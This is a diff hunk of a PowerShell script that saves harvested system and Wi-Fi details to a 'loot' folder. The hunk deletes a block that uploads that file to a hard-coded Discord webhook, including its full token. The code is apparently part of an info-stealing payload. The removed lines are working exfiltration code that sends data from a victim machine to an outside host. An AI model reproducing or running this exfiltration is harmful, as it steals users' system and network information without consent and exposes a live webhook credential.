@@ -113,13 +113,3 @@ $($wifiInfo | Format-Table -AutoSize | Out-String)
 
 # SAVE TO FILE
 $output | Out-File -FilePath "$LootDir\computer_info.txt" -Encoding UTF8
-
-# OPTIONAL: UPLOAD TO DISCORD
-$webhookUrl = "https://discord.com/api/webhooks/1428095697907093587/tv1cDhhfMl2cG32uzGrQgeTK-tTGk0L9dHvNcRkK6VbFKcQWYokDGPx47Lb4GvWl5G2m"
-if ($webhookUrl -ne "YOUR_WEBHOOK_URL") {
-    $body = @{
-        content = "System audit from $($sysInfo.ComputerName)"
-        file = Get-Item -Path $outputFile
-    }
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data"
-}
